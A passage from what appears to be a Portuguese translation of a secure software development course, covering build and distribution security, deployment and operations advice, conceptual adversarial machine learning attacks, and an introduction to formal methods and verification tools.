invasores. Se você precisar usar senhas, certifique-se de que sejam longas e não compartilhadas entre pessoas.</p> <p>Considere usar "proteção de branch" ou similar, se o seu sistema de controle de versão suportar, para restringir operações que podem ocorrer em determinados branches (como o "principal"). Por exemplo, você pode garantir que uma solicitação de mesclagem/pull request tenha sido revisada por humanos e tenha passado por verificações automatizadas antes que a alteração proposta possa ser aceita. Branches protegidas também podem impedir operações perigosas, como pushes forçados, sobrescritas de históricos de commits e alterações semelhantes.</p> <p>Sempre que possível, fortaleça o ambiente de desenvolvimento e o ambiente de distribuição para que sejam mais difíceis de atacar. Em muitos projetos, muitas ou todas as partes desses ambientes são hospedadas em outro lugar (geralmente em uma nuvem); certifique-se de que o sistema de hospedagem escolhido tenha segurança adequada. Após a escolha, consulte a documentação dos sistemas que você usa e configure-os para maximizar a segurança, por exemplo, para minimizar os privilégios concedidos a terceiros. Por exemplo, se você usa o GitHub, consulte a <a href=https://docs.github.com/en/code-security/getting-started/securing-your-repository>documentação do GitHub sobre como proteger seu repositório</a> . Se você tem uma <a href=https://docs.gitlab.com/ee/security/ >instalação do GitLab, consulte a documentação do GitLab sobre como proteger sua instalação ("segurança")</a> .</p> <p>O processo de compilação deve ser totalmente roteirizado/automatizado. Dessa forma, as compilações serão executadas de forma previsível a cada vez. Sempre que possível, o sistema de compilação deve fornecer informações de procedência, ou seja, registrar quais componentes foram incluídos na compilação e, idealmente, quais componentes foram usados ​​para executá-la. Tenha cuidado ao registrar um processo de compilação; muitas vezes, você deve evitar registrar em arquivos de log quaisquer segredos, como tokens de autenticação ativos.</p> <p>Os processos de construção, verificação e distribuição (incluindo pipelines de CI/CD) frequentemente envolvem muitos outros componentes de software reutilizáveis. Certifique-se de aplicar as boas práticas discutidas nas seções do curso sobre (1) Seleção (Avaliação) de Software de Código Aberto e (2) Download e Instalação de Software Reutilizável.</p> <p>Níveis da Cadeia de Suprimentos para Artefatos de Software, ou SLSA ("salsa"), é uma estrutura de segurança que está sendo desenvolvida como uma lista de verificação de padrões e controles para evitar adulterações, melhorar a integridade e proteger pacotes e infraestrutura. No momento em que este artigo foi escrito, ainda estava em desenvolvimento, mas você deve considerar suas recomendações. O SLSA está sendo desenvolvido pela Open Source Security Foundation (OpenSSF). Para saber mais, consulte a <a href=https://slsa.dev/ >página inicial do SLSA</a> .</p> <p>Outra fonte de boas ideias sobre como proteger ambientes de desenvolvimento contra ataques, bem como muitas outras abordagens para melhorar a segurança, estão nas <a href=https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf>Melhores Práticas da Cadeia de Suprimentos de Software</a> da Cloud Native Computing Foundation (CNCF).</p> <p>Se um invasor conseguir subverter o processo de compilação, os resultados subvertidos costumam ser difíceis de detectar. Uma forte contramedida para esse ataque é uma <em>compilação reproduzível verificada</em> . Uma compilação é reproduzível "se, dado o mesmo código-fonte, ambiente de compilação e instruções de compilação, qualquer parte pode recriar cópias idênticas, bit a bit, de todos os artefatos especificados" (conforme definido em <a href=https://reproducible-builds.org/docs/definition/ >"Definições" do projeto Compilações Reproduzíveis</a> ). Uma compilação reproduzível também é chamada de compilação determinística. Uma compilação reproduzível verificada é simplesmente uma compilação que foi verificada independentemente como sendo reproduzível (em computadores diferentes). Compilações reproduzíveis verificadas tornam o ataque ao processo de compilação muito mais difícil, pois o invasor precisa subverter vários sistemas de compilação independentes para subverter com sucesso a compilação do software.</p> <p>Muitas compilações são reproduzíveis sem alterações, porém, algumas não. O primeiro passo para criar uma compilação reproduzível geralmente é verificar se, se você executar a mesma compilação duas vezes no mesmo sistema, o resultado será o mesmo (uma compilação <em>repetível</em> ). Usar uma imagem de contêiner (como uma imagem do Docker) ou uma imagem virtual para o ambiente pode ajudar a criar um ambiente consistente para a execução de compilações reproduzíveis. Aqui estão alguns desafios comuns na criação de compilações reproduzíveis:</p> <ul> <li>O resultado da compilação pode incluir registros de data/hora. Se não for possível removê-los facilmente, uma solução comum é usar a última modificação de algo (geralmente o código-fonte) para definir os registros de data/hora em qualquer resultado (usando mecanismos como a variável de ambiente <strong>SOURCE_DATE_EPOCH ).</strong></li> <li>Alguns valores podem estar em uma ordem "arbitrária" (por exemplo, devido à execução paralela). Uma solução comum é ordenar os resultados (por exemplo, lexicograficamente).</li> </ul> <p>Mais informações sobre como criar compilações reproduzíveis estão disponíveis; consulte a <a href=https://reproducible-builds.org/docs/ >"Documentação" do projeto Compilações Reproduzíveis</a> .</p> <p><strong>Observação:</strong> o reforço do pipeline de CI/CD contra acesso não autorizado, código malicioso ou comprometimento do sistema faz parte do OWASP Top 10 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/8 title="GitHub Issue: squidfunk/mkdocs-material #8">#8</a> de 2021 (A08:2021), <em>Falhas de Integridade de Software e Dados</em> .</p> <h1 id=distribuicao-implantacaoimplantacao-operacoes-e-descarte>Distribuição, Implantação/Implantação, Operações e Descarte<a class=headerlink href=#distribuicao-implantacaoimplantacao-operacoes-e-descarte title="Permanent link">¶</a></h1> <p>Nenhum curso ensina tudo. Este programa de certificação profissional concentra-se no <em>desenvolvimento de</em> software seguro, incluindo sua distribuição. Não focamos intencionalmente nos processos pós-desenvolvimento, incluindo distribuição, implantação, operações e descarte de software. Um dos motivos é que já existem muitos documentos e diretrizes que tentam ajudar as pessoas a fazer isso com segurança. Esses esforços são frequentemente prejudicados porque tentam manipular botões de configuração em uma tentativa inútil de transformar software inseguro em software seguro.</p> <p>É claro que distribuição, implantação, operações e descarte são importantes. Muitos projetos aplicam uma abordagem DevOps ou DevSecOps, que intencionalmente mescla esses processos com o desenvolvimento. Mesmo que o desenvolvimento seja realizado por uma equipe diferente, ter distribuição, implantação, operações e descarte seguros é fundamental para que o software seja seguro no mundo real. Portanto, embora este curso não se concentre nesses processos, aqui estão algumas dicas sobre eles que podem ajudar você.</p> <p><strong>Ao distribuir:</strong></p> <ul> <li>Certifique-se de que o software, incluindo qualquer configuração fornecida, passe por todas as verificações automatizadas <em>antes de</em> ser distribuído aos usuários. A verificação automatizada deve incluir os testes automatizados. A validação deve incluir a validação de <strong>todo</strong> o sistema à medida que você o entrega (testes "de ponta a ponta", não apenas testes "unitários" ou "de componentes"). Se você não puder liberar o software com segurança após ele passar pela verificação automatizada, aprimore seu processo de verificação.</li> <li>Automatize o processo de distribuição. Em muitos casos, isso deve ser chamado de processo de verificação automatizado, para garantir que o que está sendo distribuído passe pela verificação automatizada.</li> <li>Use HTTPS (TLS) para que as pessoas possam verificar se é o domínio pretendido e se as informações não podem ser manipuladas entre o servidor e o destinatário.</li> <li>Sempre que possível, assine as informações distribuídas usando uma chave privada <em>não</em> disponível para o servidor que está distribuindo o software. Idealmente, as versões de software devem ser atribuídas por uma chave privada que nunca esteja disponível na Internet. Isso permite a verificação externa (usando a chave pública correspondente), mesmo que o servidor esteja comprometido. Infelizmente, isso requer a garantia de que as chaves públicas sejam distribuídas com segurança aos destinatários. Em alguns casos, garantir que os destinatários tenham as chaves públicas corretas pode ser um problema desafiador, enquanto em outros casos isso é fácil. Uma solução comum para atualizações de software é aceitar uma atualização se ela for assinada pela mesma chave que assinou a versão atualmente instalada do software. O <a href=https://www.sigstore.dev/ >projeto sigstore</a> está trabalhando para desenvolver maneiras mais fáceis de assinar e verificar artefatos de software..</li> <li>Se você estiver distribuindo um aplicativo, programe-o para que ele seja atualizado por padrão (mas permita que o usuário desative essa opção). Os usuários geralmente não atualizam, a menos que seja automático.<ul> <li>Sempre que possível, tente distribuir as atualizações em etapas (por exemplo, para um conjunto menor, verifique se a atualização funciona e, em seguida, atualize para um conjunto maior). Dessa forma, se um erro passar despercebido, o dano total será reduzido.</li> <li>Considere usar mecanismos de atualização <strong>existentes</strong> quando disponíveis e apropriados.</li> <li>Existe o risco de um invasor subverter seu processo de compilação ou distribuição, portanto, proteja esses processos e garanta que as atualizações sejam aceitas somente se forem assinadas por uma chave privada que nunca é conectada à Internet.</li> </ul> </li> </ul> <p>Observe que nossa discussão anterior sobre aquisição de software abordou os problemas de distribuição do lado oposto. Ou seja, ao adquirir software, você quer garantir que receberá o que deveria receber e, ao distribuir software, quer facilitar a verificação disso para os destinatários.</p> <p>Novamente, considere as recomendações de <a href=https://slsa.dev/ >Níveis da cadeia de suprimentos para artefatos de software</a> , ou SLSA ("salsa").</p> <p><strong>Ao colocar em campo/implantar, incluindo atualizações:</strong></p> <ul> <li>Configure seu ambiente de produção para ser seguro, incluindo todos os componentes dos quais você depende, e mantenha-o atualizado. Por exemplo:<ul> <li>Seu ambiente deve ser configurado para fornecer o mínimo de privilégios e usar o máximo de configurações de segurança permitidas pelo seu sistema.</li> <li>Cuidado com <em>"configurações padrão inseguras, configurações incompletas ou ad hoc, armazenamento em nuvem aberto, cabeçalhos HTTP mal configurados e mensagens de erro detalhadas contendo informações confidenciais"</em> (como observa o OWASP).</li> <li>Fortaleça seu ambiente habilitando ao máximo as contramedidas de segurança e eliminando componentes não utilizados (para que suas vulnerabilidades não possam ser exploradas). Esses componentes incluem seus sistemas operacionais, sistemas de banco de dados, monitor de máquina virtual, máquinas virtuais, infraestrutura de tempo de execução de contêineres, contêineres e tudo o mais que você usa ou depende. Existem muitos documentos que discutem como fortalecer vários componentes; use-os!</li> <li>Sempre que possível, habilite as atualizações automáticas. Essa <em>deve</em> ser a configuração padrão.</li> </ul> </li> <li>Evite dar acesso direto ao seu banco de dados, a menos que seja necessário e você tenha verificado que ele é seguro.</li> <li>Certifique-se de que todos os conjuntos de dados tenham privilégios <em>limitados</em> . Em particular, se você usar buckets do AWS S3 para dados não públicos, certifique-se de que eles tenham acesso muito limitado (muitos buckets do S3 com dados não públicos tornaram-se publicamente legíveis).</li> <li>Onde fizer sentido, habilite a criptografia completa do disco e/ou a criptografia do banco de dados.</li> <li>Habilite sistemas de monitoramento que irão avisá-lo, ou atualizar automaticamente, quando um componente em uso tiver uma vulnerabilidade conhecida.</li> <li>Ative o registro e redirecione-o para um local central protegido para monitoramento. Habilite sistemas automatizados para detectar e alertar sobre possíveis problemas de segurança.</li> </ul> <p><strong>Ao operar:</strong></p> <ul> <li>Atualizar componentes em tempo hábil (às vezes chamado de <em>gerenciamento de patches e vulnerabilidades</em> ). Em algumas organizações, essa tarefa é dividida entre desenvolvedores, que atualizam componentes dentro de um aplicativo, e operadores, que atualizam componentes externos dos quais o aplicativo depende. Independentemente de como você faça isso, os componentes precisam ser atualizados em tempo hábil, ou um invasor poderá explorá-los.</li> <li>Examine avisos e/ou registros regularmente. Determine quais são indicadores de um incidente.</li> <li>Responda em tempo hábil aos incidentes.</li> <li>Depois que uma vulnerabilidade ou incidente for resolvido, use a análise de causa raiz para descobrir <em>por que isso aconteceu,</em> para que mudanças possam ser feitas para evitar uma recorrência semelhante.</li> <li>Crie backups e armazene-os com segurança (os invasores adoram obter cópias de backups). Teste para garantir que você consiga se recuperar deles. Certifique-se de ter backups offline ("frios") para combater ransomware (que invade, criptografa seus dados e os retém para resgate).</li> <li>Ao receber um relatório de vulnerabilidade, processe-o e corrija-o em tempo hábil. Em seguida, dê crédito público ao denunciante, a menos que ele solicite o contrário.</li> </ul> <p>Ao descartar, certifique-se de destruir completamente todos os dados que você pretende destruir. A simples remoção de um arquivo não remove seu conteúdo da maioria dos dispositivos de armazenamento.</p> <h1 id=inteligencia-artificial-ia-aprendizado-de-maquina-ml-e-seguranca>Inteligência Artificial (IA), Aprendizado de Máquina (ML) e Segurança<a class=headerlink href=#inteligencia-artificial-ia-aprendizado-de-maquina-ml-e-seguranca title="Permanent link">¶</a></h1> <p>Inteligência artificial (IA) é a inteligência demonstrada por máquinas (a inteligência de humanos e animais às vezes é chamada de inteligência natural). Aprendizado de máquina (ML) é um campo de pesquisa dedicado a compreender e desenvolver métodos que "aprendem", ou seja, métodos que utilizam dados para melhorar o desempenho em um conjunto de tarefas ( <em>Aprendizado de Máquina</em> , Tom Mitchell). ML é frequentemente considerado um subconjunto da IA. Uma quantidade significativa de trabalhos sobre segurança de IA hoje se concentra em ML; abordaremos o mesmo tema aqui.</p> <p>A construção de sistemas de ML geralmente envolve vários processos, como treinamento, teste e inferência. A inferência ocorre quando o sistema de ML está sendo utilizado por seus usuários. Muitos projetos de ML pressupõem um ambiente fechado e confiável, sem ameaças à segurança. No entanto, essa suposição costuma ser irrealista.</p> <p>Aprendizado de máquina adversário é o conjunto de esforços para proteger o pipeline de ML e garantir sua segurança durante treinamento, teste e inferência. Esta é uma área de estudo ativa e a terminologia varia. Dito isso, existem muitos tipos de ataques potenciais a sistemas de ML, incluindo os listados abaixo.</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Evasão ("fazer/inferir a coisa errada")</td> <td>Em um ataque de evasão, o invasor fornece uma entrada modificada ao classificador de um sistema de ML durante a inferência, de modo que ela seja classificada incorretamente, mantendo a modificação a menor possível (Nicolae et al., 2019). Por exemplo, um invasor pode criar marcações sutis em uma estrada para convencer um carro autônomo a desviar inesperadamente para o tráfego em sentido contrário. Essas entradas modificadas são às vezes chamadas de <em>entradas adversárias</em> . Entradas adversárias podem permitir que o invasor controle o sistema dependendo do classificador. Portanto, esse tipo de ataque pode levar à perda de integridade e/ou disponibilidade.</td> </tr> <tr> <td>Perda de confidencialidade ("revelar a coisa errada")</td> <td>Um invasor pode usar os resultados da consulta para revelar informações ocultas. Portanto, esse tipo de ataque pode levar à perda de confidencialidade. Esse tipo de ataque pode ser subdividido em outras categorias, por exemplo:<br><br>- <em>Extração</em> . Em um ataque de extração, o invasor extrai os parâmetros ou a estrutura do modelo a partir de observações das previsões do modelo (Tabassi, 2019).<br>- <em>Inferência (de associação)</em> . Em um ataque de inferência de associação, o invasor usa os resultados da consulta do modelo de destino para determinar se pontos de dados específicos pertencem à mesma distribuição que o conjunto de dados de treinamento (Tabassi, 2019).<br>- <em>Inversão (de modelo)</em> . Em um ataque de inversão, o invasor consegue reconstruir (alguns) dados usados ​​para treinar o modelo, incluindo dados privados e/ou secretos (Tabassi 2019).</td> </tr> <tr> <td>Crédito: As descrições simples mostradas acima entre parênteses e aspas duplas foram cunhadas pelo Dr. Jeff Alstott.</td> <td></td> </tr> </tbody> </table> <p>O trabalho tem se concentrado especialmente no combate à evasão (inputs adversários) em sistemas de ML. Infelizmente, muitas abordagens que parecem combater a evasão não conseguem combater invasores não ingênuos. Aqui estão alguns exemplos de abordagens que não combatem invasores determinados:</p> <ul> <li><em>O treinamento adversário</em> cria entradas adversárias e, em seguida, treina o modelo com base nessas entradas. Isso pode melhorar a robustez, mas um invasor pode simplesmente repetir esse processo com mais frequência do que o defensor.</li> <li><em>A rotulagem nula</em> tenta treinar um modelo para que certas entradas sejam provavelmente adversas (e devem ser classificadas como resultados "nulos"). Novamente, isso parece ser fraco contra adversários determinados, como explicado por Carlini e Wagner ("Exemplos Adversariais Não São Facilmente Detectados: Ignorando Dez Métodos de Detecção", de Nicholas Carlini e David Wagner, 2017.)</li> </ul> <p>Uma ferramenta que pode ser útil é a <a href=https://github.com/Trusted-AI/adversarial-robustness-toolbox/wiki/ >Adversarial Robustness Toolbox (ART)</a> . A publicação " <a href=https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/ >Integrar ataques adversários em um pipeline de treinamento de modelo"</a> , de Singh et al., fornece um exemplo de como a ART pode ser integrada a um pipeline maior. No entanto, antes de usar qualquer ferramenta, você precisa determinar se ela é eficaz o suficiente para as suas circunstâncias.</p> <p>ML Adversarial é uma área de pesquisa ativa. Antes de usar contramedidas, determine se elas serão adequadas para seus propósitos. Muitas contramedidas funcionam apenas contra invasores ingênuos que não compensam as contramedidas. Dependendo de seus propósitos, pode não haver <em>nenhuma</em> contramedida que neutralize adequadamente os invasores com a devida confiança. <em>Muitas</em> contramedidas foram propostas e posteriormente consideradas inadequadas. Um artigo que discute como avaliar contramedidas é de <a href=https://arxiv.org/pdf/1902.06705>Nicholas Carlini, Anish Athlye, Nicolas Papernot et al., "On Evaluating Adversarial Robustness", 20/02/2019</a> . Esperamos que, no futuro, haja contramedidas melhores com maior confiança em todo o setor.</p> <h1 id=metodos-formais>Métodos formais<a class=headerlink href=#metodos-formais title="Permanent link">¶</a></h1> <p>Hoje em dia, a maioria dos softwares precisa ser desenvolvida para ser "razoavelmente" ou "adequadamente" segura. Este programa se concentrou em técnicas para ajudar você a fazer isso. No entanto, se for <em>extremamente crítico</em> que seu software atenda a alguns critérios – como alguns critérios de segurança – há uma abordagem adicional que você deve conhecer: <em>métodos formais</em> .</p> <p>Métodos formais são o uso de <em>"técnicas e ferramentas matematicamente rigorosas para a especificação, projeto e verificação de sistemas de software e hardware"</em> , onde "matematicamente rigoroso" significa que <em>"as especificações são declarações bem formadas em uma lógica matemática e que as verificações formais [se houver] são deduções rigorosas nessa lógica"</em> ( <em><a href=http://shemesh.larc.nasa.gov/fm/fm-what.html>O que são Métodos Formais?,</a></em> por Ricky W. Butler). Em resumo, os métodos formais aplicam matemática ao software.</p> <p>As grandes vantagens dos métodos formais são:</p> <ul> <li>Você pode eliminar muitas fontes de ambiguidade.</li> <li>Você pode <em>provar</em> que certas coisas são verdadeiras ou falsas, dadas certas suposições (e você pode decidir quais são essas suposições).</li> </ul> <p>As grandes desvantagens dos métodos formais são:</p> <ul> <li>Hoje em dia, usar métodos formais para desenvolver software geralmente exige mais esforço.</li> <li>Em muitos casos, o uso de métodos formais também requer conhecimento especializado (por exemplo, de matemática e/ou das ferramentas de métodos formais que estão sendo usadas).</li> </ul> <p>Muitas pessoas estão trabalhando no desenvolvimento e aprimoramento de ferramentas para superar essas desvantagens.</p> <p>Métodos formais estão sendo usados ​​hoje para desenvolver software, por exemplo:</p> <ul> <li>Engenheiros da Amazon Web Services (AWS) usam o TLA+ para analisar serviços, incluindo o amplamente utilizado Simple Storage Service (S3) e o DynamoDB (um armazenamento de dados NoSQL). Para mais detalhes, consulte " <a href=https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf><em>Use of Formal Methods at Amazon Web Services"</em></a> (2014) e " <a href=https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext><em>How Amazon Web Services Uses Formal Methods"</em></a> (2015), de Chris Newcombe, Tim Rath, Fan Zhang, Bogdan Munteanu, Marc Brooker e Michael Daerdeuff.</li> <li>O kernel do sistema operacional seL4 (um kernel OSS) foi comprovado correto.</li> <li>A implementação s2n do TLS/SSL teve verificação formal de aspectos importantes e também verificou formalmente sua implementação do algoritmo HMAC ( <em><a href=https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/ >Automated Reasoning and Amazon s2n</a></em> , por Colm MacCarthaigh, 2016).</li> <li>Muitos protocolos criptográficos propostos são examinados com verificadores de modelos para possíveis explorações, e algumas ferramentas incorporam abordagens de métodos formais para abordar certos tipos de problemas ( <em><a href=https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf>Reduzindo dramaticamente vulnerabilidades de software: Relatório ao Escritório de Política Científica e Tecnológica da Casa Branca</a></em> , por Paul E. Black, Lee Badger, Barbara Guttman e Elizabeth Fong, 2016).</li> <li>Hubert Garavel ( <em><a href="https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?__blob=publicationFile&v=1">Métodos formais para sistemas de computadores seguros e protegidos</a></em> , 2013) fornece uma grande lista onde métodos formais foram usados, bem como uma pesquisa mais ampla sobre métodos formais.</li> </ul> <p>Dito isso, o uso de métodos formais durante o desenvolvimento de software é incomum hoje em dia. Mas métodos formais podem se tornar mais comuns no futuro, ou você pode ser solicitado a desenvolver software com risco extremamente alto de vulnerabilidade. Portanto, nesta seção, forneceremos um breve conhecimento sobre métodos formais.</p> <p>Antes de fazermos isso, precisamos deixar uma coisa clara: métodos formais sempre exigem suposições. Se as suposições forem falsas, suas conclusões não serão necessariamente válidas. Por exemplo, você pode provar que algo é verdadeiro se a CPU funcionar corretamente; um bug na CPU significa que a prova não se sustenta nesse caso. Isso não torna os métodos formais inúteis, pois eles podem eliminar muitos outros problemas, e você pode escolher o que presumir. Mas é importante lembrar que quando alguém diz "algo está provado", na verdade está provado sob certas suposições... e é importante entender quais são essas suposições.</p> <h1 id=niveis-de-metodos-formais>Níveis de Métodos Formais<a class=headerlink href=#niveis-de-metodos-formais title="Permanent link">¶</a></h1> <p>Devido ao esforço extra, métodos formais são frequentemente aplicados a um subconjunto de componentes ou propriedades específicas que são especialmente importantes. Métodos formais também podem ser aplicados em vários níveis. Há uma terminologia variada para esses níveis, mas uma maneira são estes três níveis:</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Nível 0</td> <td>- Uma especificação formal é criada (ou seja, técnicas baseadas em matemática são usadas para descrever rigorosamente o que o programa deve fazer). O programa é então desenvolvido informalmente a partir dela. Isso às vezes é chamado de <em>métodos formais lite</em> . Essa abordagem pode ajudar a remover algumas ambiguidades.</td> </tr> <tr> <td>Nível 1</td> <td>Aplique o nível 0 e então prove algumas propriedades selecionadas a partir dele ou faça um refinamento formal da especificação em direção a algo que se tornará o programa.</td> </tr> <tr> <td>Nível 2</td> <td>Prove completamente as alegações de um programa, incluindo a verificação mecânica. Isso proporciona os resultados mais consistentes, mas também exige mais esforço.</td> </tr> <tr> <td># Como a matemática pode ser aplicada? Expressões Booleanas</td> <td></td> </tr> </tbody> </table> <p>Existem muitas maneiras diferentes de aplicar a matemática e, portanto, existem muitas maneiras diferentes de usar métodos formais. Vamos analisar brevemente alguns conceitos matemáticos comuns usados ​​em métodos formais.</p> <p>Uma ferramenta amplamente utilizada é a ideia de expressões booleanas. Essas expressões são verdadeiras ou falsas e podem incluir vários <em>conectivos proposicionais</em> (uma proposição é simplesmente algo que é verdadeiro ou falso). Aqui estão os conectivos proposicionais comuns. Os três primeiros devem ser bastante familiares para você, já que as linguagens de programação os copiaram da matemática, mas sua notação matemática tradicional pode ser nova para você:</p> <ol> <li>"x e y" (matemático "x ∧ y") é verdadeiro se x e y forem verdadeiros, caso contrário, é falso.</li> <li>"x ou y" (matemático "x ∨ y") é verdadeiro se x e y ou ambos forem verdadeiros; se ambos forem falsos, é falso.</li> <li>"não x" (matemático "￢x") é verdadeiro se x for falso, e é falso se x for verdadeiro.</li> <li>"x→y" é verdadeiro se x for falso ou se y for verdadeiro, ou seja, "x → y" é o mesmo que "((não x) ou y)". A seta é frequentemente lida como "implica". Este operador pode ser novo para você, mas esta seta representa simplesmente "se x é verdadeiro, então y é verdadeiro". É formalmente chamado de <em>implicação material</em> .</li> <li>"x↔y" é verdadeiro se x e y têm o mesmo valor. Isso é basicamente "esses valores são iguais" para valores booleanos. Às vezes, é lido como "se e somente se" (iff).</li> </ol> <p>Você pode achar mais fácil entender os conectivos observando a tabela a seguir. Esta tabela mostra os resultados desses conectivos, dados os possíveis valores de entrada de x e y (nesta tabela, V é verdadeiro, enquanto F é falso):</p> <p>Tabela: Conectivos Proposicionais</p> <table> <thead> <tr> <th><strong>x</strong></th> <th><strong>e</strong></th> <th><strong>x ∧ y</strong></th> <th><strong>x ∨ y</strong></th> <th><strong>￢x</strong></th> <th><strong>x→y</strong></th> <th><strong>x↔y</strong></th> </tr> </thead> <tbody> <tr> <td><strong>F</strong></td> <td><strong>F</strong></td> <td><strong>F</strong></td> <td><strong>F</strong></td> <td><strong>T</strong></td> <td><strong>T</strong></td> <td><strong>T</strong></td> </tr> <tr> <td><strong>F</strong></td> <td><strong>T</strong></td> <td><strong>F</strong></td> <td><strong>T</strong></td> <td><strong>T</strong></td> <td><strong>T</strong></td> <td><strong>F</strong></td> </tr> <tr> <td><strong>T</strong></td> <td><strong>F</strong></td> <td><strong>F</strong></td> <td><strong>T</strong></td> <td><strong>F</strong></td> <td><strong>F</strong></td> <td><strong>F</strong></td> </tr> <tr> <td><strong>T</strong></td> <td><strong>T</strong></td> <td><strong>T</strong></td> <td><strong>T</strong></td> <td><strong>F</strong></td> <td><strong>T</strong></td> <td><strong>T</strong></td> </tr> <tr> <td># Como a matemática pode ser aplicada? Conjuntos</td> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> </tbody> </table> <p>Outra ferramenta matemática amplamente utilizada é a ideia de conjuntos. Um conjunto é simplesmente uma coleção não ordenada de elementos, onde os próprios elementos podem ser conjuntos. Por exemplo, se você disser "S = {4, 5, 6}", isso significa apenas que o conjunto S tem 3 elementos (especificamente 4, 5 e 6). Você pode então aplicar várias operações aos conjuntos, por exemplo:</p> <ul> <li>A operação "A ∈ B" retorna verdadeiro se e somente se o lado esquerdo A for um membro do lado direito B. Portanto, dada a definição anterior de S, "4 ∈ S" é verdadeiro (porque 4 é um membro de S), enquanto "7 ∈ S" é falso (porque 7 não é um membro de S).</li> <li>A operação "A⊂B" retorna verdadeiro se e somente se o conjunto A for um subconjunto do conjunto B. Em outras palavras, "A⊂B" é verdadeiro se cada membro de A também for um membro de B. Portanto, "{4,6}⊂S" é verdadeiro, porque 4 e 6 são membros de S.</li> </ul> <h1 id=como-a-matematica-pode-ser-aplicada-quantificadores>Como a matemática pode ser aplicada? Quantificadores<a class=headerlink href=#como-a-matematica-pode-ser-aplicada-quantificadores title="Permanent link">¶</a></h1> <p>Uma ferramenta matemática amplamente utilizada que você talvez não tenha visto é a ideia de <em>quantificadores</em> . Eles retornam valores verdadeiros ou falsos com base em certas condições:</p> <ul> <li>Expressão ∀ X  <em>:</em> Isso é verdadeiro se, e somente se, a <em>expressão</em> for sempre verdadeira para todos os valores permitidos de X. Ela essencialmente "faz um loop" sobre todos os valores que X poderia ter. O ∀ (um A invertido) é lido como "para todos". Isso permite afirmar facilmente que algo é sempre verdadeiro.</li> <li><em>∃ Expressão</em> X  : Isso é verdadeiro se, e somente se, houver algum valor permitido de X em que a <em>expressão</em> seja verdadeira. O ∃ é lido como "existe". Isso permite afirmar facilmente que algo ocorre pelo menos uma vez.</li> </ul> <p>Isso significa que você pode usar expressões como "∀ X (válido(X) → bem_formado(X))" para dizer "para todos os valores de X, se X for válido, então X é bem-formado"... ou, dito de outra forma, se X for válido, então X é bem-formado. Observe que toda essa expressão é verdadeira se estivermos falando de dados XML.</p> <h1 id=declaracoes-matematicas-versus-o-mundo-real>Declarações matemáticas versus o mundo real<a class=headerlink href=#declaracoes-matematicas-versus-o-mundo-real title="Permanent link">¶</a></h1> <p>Declarações matemáticas podem ser usadas para modelar o mundo real, mas não confunda declarações matemáticas como sendo as mesmas do mundo real!</p> <p>Em particular, você pode facilmente criar afirmações matemáticas que não correspondem ao que você realmente quer dizer. Por exemplo, as línguas naturais às vezes usam "e" e "ou" de uma forma diferente da que definimos acima. Isso é especialmente problemático para "ou", que em matemática e computação é verdadeiro quando ambos os lados são verdadeiros (também conhecido como "ou inclusivo"), mas na linguagem natural às vezes fica implícito que apenas um será verdadeiro (também conhecido como "ou exclusivo"). Por exemplo, na frase "iremos ao cinema ou a uma peça hoje à noite", o falante provavelmente não quer dizer que poderíamos fazer <em>as duas coisas</em> . Usar a matemática pode remover muitas ambiguidades como essa, mas você terá que decidir se essa expressão é o que você <em>quer dizer</em> .</p> <h1 id=ferramentas-de-metodos-formais>Ferramentas de Métodos Formais<a class=headerlink href=#ferramentas-de-metodos-formais title="Permanent link">¶</a></h1> <p>Há um grande número de ferramentas que dão suporte a métodos formais.</p> <p>Praticamente qualquer ferramenta (até mesmo um processador de texto!) pode ser usada para capturar requisitos de forma rigorosa e formal. Algumas ferramentas são projetadas exatamente para isso. Um exemplo é o Alloy, projetado para facilitar a captura formal de requisitos e realizar algumas verificações rápidas.</p> <p>Algumas ferramentas também são projetadas para verificar se as afirmações são matematicamente verdadeiras.</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Provadores de teoremas</td> <td>Elas tentam comprovar objetivos, dadas as premissas, usando apenas uma sequência de regras permitidas. Algumas são totalmente automatizadas, enquanto outras são interativas. As ferramentas interativas podem lidar com problemas mais complexos, mas geralmente são mais difíceis de usar.<br><br>- Os provadores de teoremas automatizados OSS amplamente utilizados incluem E e SPASS.<br>- Os provadores de teoremas interativos OSS amplamente utilizados incluem Coq e Isabelle.</td> </tr> <tr> <td>Solucionadores de satisfatibilidade (SAT) / Teorias de módulo SAT (SMT)</td> <td>Eles pegam um conjunto de equações com variáveis ​​e tentam encontrar um conjunto de valores para essas variáveis ​​que torne todas as equações verdadeiras. Solucionadores SAT lidam apenas com variáveis ​​e equações booleanas, enquanto solucionadores SMT podem lidar com outros valores. Alguns gerenciadores de pacotes usam internamente um solucionador SAT. Solucionadores SMT amplamente utilizados em sistemas de código aberto incluem Z3, CVC4 e Alt-Ergo-Free.</td> </tr> <tr> <td>Verificadores de modelos</td> <td>Eles pegam um modelo e demonstram "exaustivamente" que ele é verdadeiro em todos os casos, utilizando diversos truques de otimização para torná-lo prático. Um verificador de modelos genéricos de software livre amplamente utilizado é o Spin (que suporta uma linguagem chamada ProMeLa). Existem também muitas ferramentas de verificação de modelos projetadas especificamente para analisar programas. Por exemplo, o CBMC é um verificador de modelos de software livre limitado para programas em C e C++ que pode verificar a segurança da memória, verificar exceções, verificar diversas variantes de comportamento indefinido e suportar asserções especificadas pelo usuário.</td> </tr> <tr> <td>Interpretação abstrata / execução simbólica (para programas)</td> <td>Eles "executam" programas usando simplificações relevantes (interpretação abstrata) ou símbolos (execução simbólica).</td> </tr> <tr> <td></td> <td></td> </tr> <tr> <td>Existem alguns sistemas que podem combinar essas ferramentas. Por exemplo:</td> <td></td> </tr> </tbody> </table> <ul> <li>O ecossistema Why3/Frama-C combina um conjunto de ferramentas para provar que os programas estão corretos.</li> <li>Lógica Temporal de Ações+ (TLA+) é uma linguagem 